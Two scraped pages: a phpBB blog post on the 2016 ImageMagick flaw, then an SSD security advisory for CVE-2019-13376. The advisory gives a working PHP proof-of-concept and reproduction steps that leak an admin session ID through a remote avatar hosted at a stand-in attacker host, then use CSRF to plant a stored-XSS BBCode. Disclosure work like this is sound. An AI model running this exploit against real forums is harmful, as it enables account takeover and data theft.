=== Content from blog.phpbb.com_5791f4fb_20250120_231622.html ===


# [phpBB • Free and Open Source Forum Software](//www.phpbb.com/)

[![RSS](//www.phpbb.com/assets/images/icons/rss-20.png)](//www.phpbb.com/feeds/rss/)
[![Facebook](//www.phpbb.com/assets/images/icons/facebook-20.png)](https://www.facebook.com/phpBB)
[![Twitter](//www.phpbb.com/assets/images/icons/twitter-20.png)](https://www.twitter.com/phpbb)

Menu

* [About](//www.phpbb.com/about/)
  + #### [Features](//www.phpbb.com/about/features/)

    [Learn about the features that phpBB has to offer.](//www.phpbb.com/about/features/)
  + #### [Demo](//www.phpbb.com/demo/)

    [Give phpBB a try with a fully-featured demo board.](//www.phpbb.com/demo/)
  + #### [Showcase](//www.phpbb.com/showcase/)

    [A showcase of popular and unique sites using phpBB.](//www.phpbb.com/showcase/)
  + #### [Get Involved](//www.phpbb.com/get-involved/)

    [Learn how you can get involved with the project.](//www.phpbb.com/get-involved/)
  + #### [3.3 New Features](//www.phpbb.com/about/launch/)

    [An overview of the new features and improvements in phpBB 3.3.](//www.phpbb.com/about/launch/)
  + #### [The Team](//www.phpbb.com/about/team/)

    [Find out who is responsible for all the mayhem.](//www.phpbb.com/about/team/)
  + #### [Contact Us](//www.phpbb.com/about/contact/)

    [Have a question the forums don't answer? Come here.](//www.phpbb.com/about/contact/)
  + #### [Advertising](//www.phpbb.com/about/advertise/)

    [Information if you want to advertise on phpBB.com.](//www.phpbb.com/about/advertise/)[Find out more about the project »](//www.phpbb.com/about/)
* [Downloads](//www.phpbb.com/downloads/)
  + #### [Latest Version](//www.phpbb.com/downloads/)

    [Download the latest stable release of phpBB](//www.phpbb.com/downloads/)
  + #### [Update Packages](//www.phpbb.com/downloads/3.3/update)

    [Update packages for your phpBB release](//www.phpbb.com/downloads/3.3/update)
  + #### [Language Packs](//www.phpbb.com/languages/)

    [Translate phpBB into (almost) any language you like](//www.phpbb.com/languages/)
  + #### [Extensions](//www.phpbb.com/customise/db/extensions-36/)

    [Download extensions to enhance phpBB’s functionality](//www.phpbb.com/customise/db/extensions-36/)
  + #### [Styles](//www.phpbb.com/customise/db/styles-2/)

    [Your forums need a new look? Browse our Styles DB](//www.phpbb.com/customise/db/styles-2/)
  + #### [Official Tools](//www.phpbb.com/customise/db/official_tools-23/)

    [Official tools by the phpBB team to assist you with your board](//www.phpbb.com/customise/db/official_tools-23/)
* [Customise](//www.phpbb.com/customise/)
  + #### [Customisation Database](//www.phpbb.com/customise/db/)

    ![Customisation Database](//www.phpbb.com/assets/images/images/customisation-db-icon.png)

    [Our customisation database contains just about everything you might need to customise your phpBB board to your liking. In it you will find Extensions, Styles, Language Packs, BBCodes, as well as various tools.](//www.phpbb.com/customise/db/)
  + #### [Extensions](//www.phpbb.com/extensions/)

    [Guides on how to use them and how to create your own.](//www.phpbb.com/extensions/)
  + #### [Extensions DB](//www.phpbb.com/customise/db/extensions-36/)

    [Download or submit extensions to our extensions database.](//www.phpbb.com/customise/db/extensions-36/)
  + #### [Styles](//www.phpbb.com/styles/)

    [Guides on how to use them and to create your own styles.](//www.phpbb.com/styles/)
  + #### [Styles DB](//www.phpbb.com/customise/db/styles-2/)

    [Download or submit styles to our styles database.](//www.phpbb.com/customise/db/styles-2/)[More resources on customising your board »](//www.phpbb.com/customise/)
* [Support](//www.phpbb.com/support/)
  + #### [Documentation](//www.phpbb.com/support/docs/)

    [Installation guide and the complete documentation.](//www.phpbb.com/support/docs/)
  + #### [User Guide](//www.phpbb.com/support/docs/ug/)

    [Detailed articles for common issues and tasks with phpBB forums.](//www.phpbb.com/support/docs/ug/)
  + #### [Knowledge Base](//www.phpbb.com/support/docs/en/3.3/kb/)

    [Team and user submitted ar­ticles covering support areas.](//www.phpbb.com/support/docs/en/3.3/kb/)
  + #### [Support Forums](//www.phpbb.com/community/viewforum.php?f=551)

    [The Support related areas in our community forums.](//www.phpbb.com/community/viewforum.php?f=551)
  + #### [Discord / IRC](//www.phpbb.com/support/chat/)

    [Visit our Discord or IRC support channels.](//www.phpbb.com/support/chat/)
  + #### [International Support](//www.phpbb.com/support/intl/)

    [Find a 3rd party support site in your first language.](//www.phpbb.com/support/intl/)[More information on support »](//www.phpbb.com/support/)
* [Development](//www.phpbb.com/development/)
  + #### [Area51 phpBB Development](//area51.phpbb.com/)

    ![Area51 Alien](//www.phpbb.com/assets/images/aliens/alien32.png?20231217)

    [All Development Discussion takes place at Area51. Bug tracker, continuous integration and other development tools are located here. Find out how to get involved in phpBB development.](//area51.phpbb.com/)
  + #### [phpBB Bug Tracker](https://tracker.phpbb.com/)

    [Report problems with phpBB core and other sub-projects such as the Website, Customisation DB, and Team Tools here.](https://tracker.phpbb.com/)
  + #### [phpBB Ideas](//www.phpbb.com/community/ideas)

    [Suggest, vote on and comment on ideas for phpBB.](//www.phpbb.com/community/ideas)
  + #### [Security Tracker](//www.phpbb.com/security/)

    [The tracker for security issues in phpBB or validated Extensions.](//www.phpbb.com/security/)
  + #### [GSoC](//www.phpbb.com/development/gsoc)

    [Google Summer of Code is an annual program in which Google awards stipends to students participating in coding projects for free and open source software projects.](//www.phpbb.com/development/gsoc)[Participate in phpBB development now »](//www.phpbb.com/development/)
* [Blog](//blog.phpbb.com/)
* [Community](//www.phpbb.com/community/)
  + #### [Support Forums](//www.phpbb.com/community/viewforum.php?f=551)

    [Help with installation & running phpBB – search first!](//www.phpbb.com/community/viewforum.php?f=551)
  + #### [Extensions Forums](//www.phpbb.com/community/viewforum.php?f=451)

    [Discuss and view Extensions that are available for download.](//www.phpbb.com/community/viewforum.php?f=451)
  + #### [Styles Forums](//www.phpbb.com/community/viewforum.php?f=471)

    [Discuss and view Styles that are available for download.](//www.phpbb.com/community/viewforum.php?f=471)
  + #### [phpBB Discussion](//www.phpbb.com/community/viewforum.php?f=64)

    [Discussions on all things phpBB: features, future, etc.](//www.phpbb.com/community/viewforum.php?f=64)
  + #### [General Discussion](//www.phpbb.com/community/viewforum.php?f=6)

    [General discussion and intelligent conversations.](//www.phpbb.com/community/viewforum.php?f=6)
  + #### [Area51](//area51.phpbb.com/phpBB/)

    [Bleeding edge testing and development discussion.](//area51.phpbb.com/phpBB/)[… and many more forums »](//www.phpbb.com/community/)
* [Hosting](//www.phpbb.com/hosting/)

* [Home](//www.phpbb.com/)
  **‹** [Blog](https://blog.phpbb.com)

## Blog

## Archive for the ‘Security’ Category

## [phpBB not vulnerable to ImageMagick exploit](https://blog.phpbb.com/2016/05/05/phpbb-not-vulnerable-to-imagemagick-exploit/ "Permanent Link to phpBB not vulnerable to ImageMagick exploit")

Posted by Marc in [Development](https://blog.phpbb.com/category/development/), [Security](https://blog.phpbb.com/category/security/), [Support](https://blog.phpbb.com/category/support/) on May 5th, 2016

As some of you might have noticed, a security issue has recently been uncovered in ImageMagick, a widely used software suite for displaying and modifying images. You can read about the full details of the exploit on news outlets like Ars Technica ([article on ImageMagick exploit](http://arstechnica.com/security/2016/05/easily-exploited-bug-exposes-huge-number-of-sites-to-code-execution-attacks/)) and the [ImageMagick community forum](https://www.imagemagick.org/discourse-server/viewtopic.php?f=4&t=29588).

It has come to our attention that admins are unsure whether this affects their phpBB installation and/or what they might have to do to secure their installation.

First and foremost let me make it clear that, based on the currently available information, phpBB is **not vulnerable** to the exploits.

phpBB already verifies the supplied image types and therefore already contains one of the described mitigations for the ImageMagick vulnerabilities.

phpBB supports using ImageMagick for creating thumbnails only. Other parts of phpBB, such as image or general attachment uploads, are not using ImageMagick at all. The described exploits rely on directly passing uploads to ImageMagick and/or passing “clear text” image formats such as SVG or MVG to it. phpBB itself does not support these image types for creating thumbnails and therefore will not pass them onto ImageMagick. Additionally, supported image types are checked for integrity before passing it onto ImageMagick for thumbnail creation. Passing malicious files as described and disguising them as other image types is therefore not possible.

We hope this will help with clearing up any confusion or uncertainty on this subject.

[12 Comments](https://www.phpbb.com/community/viewtopic.php?t=2371166)

### Categories

* [Development](https://blog.phpbb.com/category/development/)
* [Events](https://blog.phpbb.com/category/events/)
* [Extensions](https://blog.phpbb.com/category/extensions/)
* [Moderating](https://blog.phpbb.com/category/moderating/)
* [Modifications](https://blog.phpbb.com/category/modifications/)
* [Security](https://blog.phpbb.com/category/security/)
* [Styles](https://blog.phpbb.com/category/styles/)
* [Support](https://blog.phpbb.com/category/support/)
* [Website](https://blog.phpbb.com/category/website/)

### Tags

* [administration](https://blog.phpbb.com/tag/administration/)
* [Administrator](https://blog.phpbb.com/tag/administrator/)
* [area51](https://blog.phpbb.com/tag/area51/)
* [ascraeus](https://blog.phpbb.com/tag/ascraeus/)
* [Bogus Exploits](https://blog.phpbb.com/tag/bogus-exploits/)
* [CAPTCHA](https://blog.phpbb.com/tag/captcha/)
* [Community](https://blog.phpbb.com/tag/community/)
* [Contributing](https://blog.phpbb.com/tag/contributing/)
* [Development](https://blog.phpbb.com/tag/development/)
* [development environment](https://blog.phpbb.com/tag/development-environment/)
* [Documentation](https://blog.phpbb.com/tag/documentation/)
* [Extensions](https://blog.phpbb.com/tag/extensions/)
* [Features](https://blog.phpbb.com/tag/features/)
* [feedback](https://blog.phpbb.com/tag/feedback/)
* [Git](https://blog.phpbb.com/tag/git/)
* [github](https://blog.phpbb.com/tag/github/)
* [GSoC](https://blog.phpbb.com/tag/gsoc/)
* [hooks](https://blog.phpbb.com/tag/hooks/)
* [Joomla](https://blog.phpbb.com/tag/joomla/)
* [language packs](https://blog.phpbb.com/tag/language-packs/)
* [Londonvasion](https://blog.phpbb.com/tag/londonvasion/)
* [MOD Database](https://blog.phpbb.com/tag/mod-database/)
* [moderation](https://blog.phpbb.com/tag/moderation/)
* [MODs](https://blog.phpbb.com/tag/mods/)
* [Olympus](https://blog.phpbb.com/tag/olympus/)
* [OSCON](https://blog.phpbb.com/tag/oscon/)
* [PHP](https://blog.phpbb.com/tag/php/)
* [phpBB](https://blog.phpbb.com/tag/phpbb/)
* [phpBB.com MOD Team](https://blog.phpbb.com/tag/phpbb-com-mod-team/)
* [phpbb2](https://blog.phpbb.com/tag/phpbb2/)
* [phpbb3](https://blog.phpbb.com/tag/phpbb3/)
* [phpMyAdmin](https://blog.phpbb.com/tag/phpmyadmin/)
* [resources](https://blog.phpbb.com/tag/resources/)
* [Rhea](https://blog.phpbb.com/tag/rhea/)
* [Search Engine Optimisation](https://blog.phpbb.com/tag/search-engine-optimisation/)
* [Security](https://blog.phpbb.com/tag/security/)
* [Security Tracker](https://blog.phpbb.com/tag/security-tracker/)
* [statistics](https://blog.phpbb.com/tag/statistics/)
* [Styles](https://blog.phpbb.com/tag/styles/)
* [Support](https://blog.phpbb.com/tag/support/)
* [SVN](https://blog.phpbb.com/tag/svn/)
* [Templates](https://blog.phpbb.com/tag/templates/)
* [Validation](https://blog.phpbb.com/tag/validation/)
* [Website](https://blog.phpbb.com/tag/website/)
* [wiki](https://blog.phpbb.com/tag/wiki/)

### Archives

* [October 2024](https://blog.phpbb.com/2024/10/)
* [August 2024](https://blog.phpbb.com/2024/08/)
* [June 2024](https://blog.phpbb.com/2024/06/)
* [May 2024](https://blog.phpbb.com/2024/05/)
* [February 2023](https://blog.phpbb.com/2023/02/)
* [September 2018](https://blog.phpbb.com/2018/09/)
* [September 2017](https://blog.phpbb.com/2017/09/)
* [August 2017](https://blog.phpbb.com/2017/08/)
* [May 2017](https://blog.phpbb.com/2017/05/)
* [February 2017](https://blog.phpbb.com/2017/02/)
* [December 2016](https://blog.phpbb.com/2016/12/)
* [November 2016](https://blog.phpbb.com/2016/11/)
* [October 2016](https://blog.phpbb.com/2016/10/)
* [May 2016](https://blog.phpbb.com/2016/05/)
* [March 2016](https://blog.phpbb.com/2016/03/)
* [August 2015](https://blog.phpbb.com/2015/08/)
* [July 2015](https://blog.phpbb.com/2015/07/)
* [May 2015](https://blog.phpbb.com/2015/05/)
* [August 2014](https://blog.phpbb.com/2014/08/)
* [July 2014](https://blog.phpbb.com/2014/07/)
* [February 2014](https://blog.phpbb.com/2014/02/)
* [December 2013](https://blog.phpbb.com/2013/12/)
* [November 2013](https://blog.phpbb.com/2013/11/)
* [October 2013](https://blog.phpbb.com/2013/10/)
* [July 2013](https://blog.phpbb.com/2013/07/)
* [November 2012](https://blog.phpbb.com/2012/11/)
* [July 2012](https://blog.phpbb.com/2012/07/)
* [June 2012](https://blog.phpbb.com/2012/06/)
* [May 2012](https://blog.phpbb.com/2012/05/)
* [January 2012](https://blog.phpbb.com/2012/01/)
* [August 2011](https://blog.phpbb.com/2011/08/)
* [July 2011](https://blog.phpbb.com/2011/07/)
* [March 2011](https://blog.phpbb.com/2011/03/)
* [February 2011](https://blog.phpbb.com/2011/02/)
* [January 2011](https://blog.phpbb.com/2011/01/)
* [November 2010](https://blog.phpbb.com/2010/11/)
* [October 2010](https://blog.phpbb.com/2010/10/)
* [August 2010](https://blog.phpbb.com/2010/08/)
* [July 2010](https://blog.phpbb.com/2010/07/)
* [May 2010](https://blog.phpbb.com/2010/05/)
* [April 2010](https://blog.phpbb.com/2010/04/)
* [February 2010](https://blog.phpbb.com/2010/02/)
* [January 2010](https://blog.phpbb.com/2010/01/)
* [November 2009](https://blog.phpbb.com/2009/11/)
* [October 2009](https://blog.phpbb.com/2009/10/)
* [September 2009](https://blog.phpbb.com/2009/09/)
* [August 2009](https://blog.phpbb.com/2009/08/)
* [July 2009](https://blog.phpbb.com/2009/07/)
* [June 2009](https://blog.phpbb.com/2009/06/)
* [May 2009](https://blog.phpbb.com/2009/05/)
* [April 2009](https://blog.phpbb.com/2009/04/)
* [March 2009](https://blog.phpbb.com/2009/03/)
* [February 2009](https://blog.phpbb.com/2009/02/)
* [January 2009](https://blog.phpbb.com/2009/01/)
* [November 2008](https://blog.phpbb.com/2008/11/)
* [October 2008](https://blog.phpbb.com/2008/10/)
* [September 2008](https://blog.phpbb.com/2008/09/)
* [August 2008](https://blog.phpbb.com/2008/08/)
* [July 2008](https://blog.phpbb.com/2008/07/)

© 2000, 2002, 2003, 2007 [phpBB Limited](//www.phpbb.com/about/)
• [Contact Us](//www.phpbb.com/about/contact_us.php)
• [Advertise on www.phpbb.com](//www.phpbb.com/about/advertise/)

Header illustrations by [Vlad Gerasimov](http://www.vladstudio.com/)
• Designed by [phpBB](//www.phpbb.com/) & [subBlue](http://www.subblue.com/)
• Hosting donated by [OSUOSL](http://www.osuosl.org)
• Blog powered by [WordPress](http://www.wordpress.org).



=== Content from ssd-disclosure.com_5ce87950_20250120_231624.html ===

[Skip to content](#content "Skip to content")
[![SSD icon](https://ssd-disclosure.com/wp-content/uploads/2022/08/Group-36.png)](https://ssd-disclosure.com)

# SSD Advisory – phpBB CSRF Token Hijacking leading to Stored XSS

* [September 26, 2019](https://ssd-disclosure.com/2019/09/26/)
* [SSD Secure Disclosure technical team](https://ssd-disclosure.com/author/ssd-secure-disclosure-technical-team/)
* [Vulnerability publication](https://ssd-disclosure.com/category/vulnerability-publication/)

**Vulnerability Summary**
When an admin accesses the Administrator Control Panel (ACP) in phpBB, a leftover session id GET parameter is present in the URL when he goes back to the Board index. Using a special remote avatar URL, an attacker can leak this session id value and perform a CSRF attack in order to create an XSS BBCode, allowing stored xss on the server.
**CVE**
CVE-2019-13376
**Credit**
An independent Security Researcher has reported this vulnerability to SSD Secure Disclosure Program.
**Affected Systems**
phpBB version 3.2.7
**Vendor Response**
The vulnerability was fixed in version 3.2.8
**Vulnerability Details**

##### 0x01 – Leaking the administrator’s session ID

PhpBB3 is divided into two parts: a front and back end. The front end is used to create posts, manage profiles, send private messages etc. The back end, or Administration Control Panel, is used to manage the board itself and change crucial settings such as the upload path for uploaded attachments etc. It can also be used to perform sensitive actions such as database backups. The admin panel can only be accessed by administrators of a board.
When a user is also an administrator, he usually logs into the front end context. If the admin wants to access the back end, he has to log into it again by entering his credentials. This means phpBB3 separates the front end session and back end session, but they are not exclusive to each other.
What is interesting about the Admin Panel is that the session ID of the administrative user is reflected as a GET parameter. This means if it is possible to embed an external image with an attacker controlled domain, it would be possible to leak the admin session ID of the administrator via the HTTP referrer. The session ID is shown in the next image as the *sid* parameter.

Interestingly enough, when an administrator is finished with using the back end and leaves it via clicking the ‘Board Index’ link, he is redirected to the index page of the forum and the SID parameter is still attached as a GET parameter. This is shown in the following image:

As can be seen, the SID parameter is still set as a GET parameter and has the same value. I then looked at the index page of the front end and tried to come up with a way to embed a user controlled, external image into it so the SID parameter is leaked via the HTTP Referer.
As it turns out, achieving this task was easier than expected. If a targeted phpBB3 board has remote avatars enabled, a common setting that allows users to embed avatars from a remote URL instead of uploading them.
The next screenshot shows how an external image is embedded as an avatar from the URL attacker.com:

It is possible to then have this external image embedded into the index page of the front end system via the notification system. Whenever a user receives a notification, a short summary of the notification is displayed to him (on every page), along with the user avatar of the user who caused
the notification. An example screenshot of this is shown below:

As can be seen, the remote avatar is embedded into this page (the user does not have to click the notification bell, the image is always embedded).
This means as soon as an administrator leaves the ACP and his session ID is stored as a GET parameter and a notification for this user exists, his session ID can be leaked via the HTTP referer.
Notifications are generated when:

* a user receives a PM
* a user quotes him in a post
* another user replies to the user’s thread
* a new post has been made to a subscribed thread

##### 0x02 – escalating the session ID leakage to Stored XSS

Being in possession of the session ID of the administrator is in and of it self not enough to log into his account. PhpBB3 sessions are bound to an IP.
The following is extracted from the phpBB3 Admin Dashboard, which explains the “IP Validation” setting:
*“Determines how much of the users IP is used to validate a session; All compares the complete address, A.B.C the first x.x.x, A.B the first x.x, None disables checking. On IPv6 addresses A.B.C compares the first 4 blocks and A.B the first 3 blocks.”*
This setting is per default set to A.B.C, so theoretically an attacker with enough resources and motivation could try to get an IP from the target’s carrier. However, there is a much simpler approach.
There exists a feature in the ACP that is vulnerable to CSRF attacks. This feature is the “custom Bbcode” feature. Like many other forums, phpBB3 allows forum users to use shortcodes such as [img]http://abc.com/image.jpg[/img] in posts, private messages and threads that then turn into HTML code displayed to other users. PhpBB3 ships with a couple of default ones, like [img], [url], [I] etc. As the name of the custom Bbcode ACP feature suggests, it allows to create new bbcodes. The next screenshot shows an example of how such a new custom bbCode can lead to XSS:

Now, back to the CSRF vulnerability. PhpBB3 has two mechanisms in the ACP to prevent CSRF attacks:

1. The SID of the admin MUST be sent via GET or Post
2. A CSRF nonce is generated for each form

When looking at the source code behind this bbCode form, one interesting thing can be noticed:

```
// Set up general vars
$action    = $request->variable('action', '');
$bbcode_id = $request->variable('bbcode', 0);
$submit = $request->is_set_post('submit');
$this->tpl_name = 'acp_bbcodes';
$this->page_title = 'ACP_BBCODES';
$form_key = 'acp_bbcodes';
add_form_key($form_key);
if ($submit && !check_form_key($form_key))
{
    trigger_error($user->lang['FORM_INVALID'] . adm_back_link($this->u_action),
    E_USER_WARNING);
}

```

(The code can be found in /includes/acp/acp\_bbcodes.php in the method main)
This interesting thing is that the CSRF nonce is only checked when the POST parameter submit is set. If it is not, the nonce is not checked but execution continues normally. This means the second CSRF check for this form can be bypassed by simply not sending the submit POST parameter.
Since we are in possession of the first protection, the SID of the admin it is now possible to CSRF this form. Luckily, the variable() method of the request object returns either GET or POST variables, meaning it is possible to perform the entire CSRF via GET parameters.
As a result, the CSRF can be chained with the first vulnerability. By embedding an image with an external URL into the index page of the front end that points to an attacker server that waits for the SID parameter being leaked in the HTTP Referer and then redirects the request to the image in a way that it exploits the CSRF vulnerability in the ACP.
PoC code for this:

```
<?php
$target_url = "http://localhost/phpBB3-3.2.7/";
// put the desired shortcode here. {TEXT} is dynamic and allows for example
// [xss]customCode();[/xss] to turn into <script>customCode()</script>.
$custom_shortcode = "[xss]{TEXT}[/xss]";
// the HTML replacement. You can also hardcore the code between the script tags.
$shortcode_replacement = "<script>{TEXT}</script>";
// If a session ID is available, attempt the CSRF exploit
if(strpos($_SERVER['HTTP_REFERER'], 'sid') !== false) {
    // leak the session ID of the nonce
    $parts = parse_url($_SERVER['HTTP_REFERER']);
    parse_str($parts['query'], $query);
    if(!isset($query['sid'])) {
        header('Content-Type: image/png');
        $img = imagecreatefrompng('avatar.png');
        imagepng($img);
        die;
    }
    // build the CSRF payload
    $payload = http_build_query(
        array(
            'bbcode_match' => $custom_shortcode,
            'bbcode_tpl' => $shortcode_replacement,
            'i' => 'acp_bbcodes',
            'mode' => 'bbcodes',
            'action' => 'create',
            'sid' => $query['sid']
        )
    );
    // adm is the default admin URL
    $exploit_url = $target_url . "/adm/?" . $payload;
    header('Location: ' . $exploit_url);
} else {
    header('Content-Type: image/png');
    $img = imagecreatefrompng('avatar.png');
    imagepng($img);
    die;
}

```

This code would create a XSS shortcode in the back end.

##### Steps to Recreate

1. install the latest phpBB3 version and create an administrator account
2. in the ACP, go to General ? Avatar settings and enable remote avatars
3. upload the poc.php file, along with an avatar.png to a webserver
4. edit the poc.php file so that the target URL etc are adjusted to your installation
5. create a new forum user in another tab and authenticate as him
6. set this users remote avatar by navigating to: /ucp.php ? Profile ? Edit avatar
7. Set the remote avatar URL so that the URL ends with either .jpg or png. Example:
   http://attacker.com/poc.php?image.png. Alternatively, you can just use .htaccess directives
   tohide the .php part of the URL.
8. As the forum user, send the admin a PM (content does not matter)
9. switch back to the admin user
10. Go to the back end
11. Click on Board index

You should then be able to see that a XSS shortcode has been created. This shortcode can now be abused by attackers to execute arbitrary XSS code in Private Messages, threads and posts to take over user accounts, read private messages of other users and posts that are not visible to the user. Furthermore, the attacker can XSS the admin to create and download for example database backups.

##### Additional Notes

Whenever a user logs into the front end of phpBB3, the front page is loaded with the SID parameter set as the GET parameter as well. This means it is possible to steal the SID of any user when they log in. However, the IP address validation makes this difficult to exploit.
It is also possible to exploit this vulnerability via CSRF entirely. When you load the forum (they are not protected by default via X-Frame-Options) in an iFrame and try to load the admin panel (per default the URL is /adm without supplying a valid SID as a GET parameter, the admin is redirected to the front page of the forum, with the admin SID set as a GET parameter.

## Get in touch

Any questions? Interested in our services?

We’d love to hear from you

[Contact US](#elementor-action%3Aaction%3Dpopup%3Aopen%26settings%3DeyJpZCI6IjYwMTgiLCJ0b2dnbGUiOmZhbHNlfQ%3D%3D)

[Facebook](https://www.facebook.com/ssdsecuredisclosure/)

[Twitter](https://twitter.com/SecuriTeam_SSD)

[Youtube](https://www.youtube.com/channel/UC9ZnYbYqOe6Y3eRdw0TMz9Q)

[Linkedin](https://www.linkedin.com/company/ssd-disclosure)

## [?](https://ssd-disclosure.com/faq/)

[![](https://ssd-disclosure.com/wp-content/uploads/2022/08/Path-1354.png)](https://twitter.com/securiteam_ssd)

[HOME](/)

[THE
COMMUNITY](/our-community/)

[SCOPE](/scope/)

[ADVISORIES](/advisories/)

[SUBMIT](/submit/)

[CONTACT](/contact/)

[![](https://ssd-disclosure.com/wp-content/uploads/2022/08/Path-1354.png)](https://twitter.com/securiteam_ssd)

## ?

## Get in touch

Name

Email

Subject

Message

Send

[Skip to content](#content)

Open toolbar
Accessibility Tools

Accessibility Tools

* Increase TextIncrease Text
* Decrease TextDecrease Text
* GrayscaleGrayscale
* High ContrastHigh Contrast
* Negative ContrastNegative Contrast
* Light BackgroundLight Background
* Links UnderlineLinks Underline
* Readable FontReadable Font
* Reset
  Reset


